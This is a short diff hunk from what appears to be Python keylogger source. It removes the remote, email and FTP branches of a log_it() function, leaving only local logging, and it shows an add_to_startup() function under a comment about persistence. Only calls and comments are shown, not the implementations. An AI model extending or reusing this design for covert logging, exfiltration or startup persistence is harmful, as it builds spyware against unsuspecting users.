@@ -312,20 +312,8 @@ def log_it():
     # line_buffer = '\n' + line_buffer + '\n'
     if mode == "local":
         log_local()
-    elif mode == "remote":
-        log_remote()
-    elif mode == "email":
-        email = TimerClass()
-        email.start()
-    elif mode == "ftp":
-        log_ftp()
-    elif mode == 'debug':
-        log_debug()
-    return True
-
 
 current_file_path = os.path.realpath(sys.argv[0])
-
 
 # Add to startup for persistence
 def add_to_startup():
